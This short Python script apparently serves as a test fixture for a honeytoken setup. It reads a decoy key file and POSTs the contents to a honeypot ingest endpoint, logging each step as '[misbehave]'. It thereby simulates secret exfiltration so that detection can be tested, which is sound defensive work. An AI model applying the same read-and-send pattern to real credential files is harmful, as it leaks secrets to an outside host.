import os
from pathlib import Path
import requests

HERE = Path(__file__).parent
DECOY_FILE = HERE / "decoys" / "fake_key.txt"

# use docker service DNS, not localhost
HONEYPOT_URL = os.getenv("HONEYPOT_URL", "http://honeytoken:9000/ingest")

token = DECOY_FILE.read_text(encoding="utf-8")
print(f"[misbehave] Read token from decoy: {token.strip()}")

# send the token to the honeypot
r = requests.post(HONEYPOT_URL, data=token, headers={"Content-Type": "text/plain"})
print(f"[misbehave] Sent to honeypot: {r.status_code} {r.text}")
